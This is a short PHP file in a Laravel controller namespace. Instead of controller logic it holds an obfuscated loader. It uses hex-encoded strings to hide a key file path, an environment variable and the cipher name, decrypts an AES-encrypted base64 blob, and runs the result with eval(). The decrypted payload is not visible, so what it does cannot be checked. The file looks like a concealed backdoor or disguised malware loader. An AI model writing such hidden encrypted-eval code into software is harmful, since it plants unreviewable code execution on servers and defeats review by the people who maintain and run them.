<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('aw18/zPSkgA8Ay05MQ9UTw==');

$c=base64_decode(

'yoB7UL0EhIBNFFk4BUlMUjC0UpKWayDj+3fsPOWZAA1ZdAMq17h+1AY1Coh8FtYxaJr39S+dfkLq' .
'stStfDdGhewG1mqEh29ddlTjEP57oki3/xmpcU0xH2mhs+yVfGQhWWN3fOr4CB3ILQ1EQWBg760X' .
'DDd30mW2wscRF+0Sx6vKneBeilA0R0+Q6JD6vQKMBjgWYwkuBZMueEtAwQw9YM6KwzFXWiyNDSic' .
'd8/WLVJIKv3+awNqRIYg96boff+s'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

